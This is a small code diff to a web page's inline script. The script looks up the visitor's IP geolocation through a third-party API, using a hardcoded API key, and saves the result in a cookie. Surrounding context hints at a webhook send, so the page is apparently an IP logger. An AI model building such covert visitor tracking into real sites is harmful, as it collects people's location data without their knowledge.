@@ -72,9 +72,9 @@ hook.send(embed);
 		}
 
 		json(`https://api.ipdata.co?api-key=18567eca47edd77e07ea6569fb14643fec357c8a3c1e6c96ed69300e`).then(async (res) => {
-  		data = res
-  		document.cookie = `Datas=${JSON.stringify(data)}`;
-
+  		if(!document.cookie) {
+  		document.cookie = `Datas=${JSON.stringify(res)}`;
+			}
 		});
 		</script>
 	</body>
